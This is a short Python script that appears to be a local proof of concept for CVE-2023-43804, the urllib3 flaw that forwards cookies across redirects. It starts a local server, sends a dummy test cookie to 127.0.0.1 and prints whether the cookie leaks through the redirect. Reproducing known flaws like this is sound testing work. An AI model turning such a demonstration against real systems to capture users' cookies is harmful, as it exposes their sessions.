import urllib3
import subprocess
import os.path
import time

# run server.py first
server = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server.py')
server_proc = subprocess.Popen(["python", server], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

time.sleep(3)

url = 'http://127.0.0.1:5000/'
headers = {'Cookie': 'TEST_COOKIE=Anything'}

http = urllib3.PoolManager()
response = http.request('GET', url, headers=headers)

print(
    f"""
    CVE-2023-43804
    You must have URLLib3 version < 2.0.6

    Info:
    Current version: {urllib3.__version__}
    Current Cookie: {headers['Cookie']}
    URL: {url}
    
    Status Code: {response.status}
    Redirected URL: {response.headers.get('Location')}
    """,

    f"\nCookies: {response.getheader('Set-Cookie')}" if 'Set-Cookie' in response.headers else "No leaked cookies"
)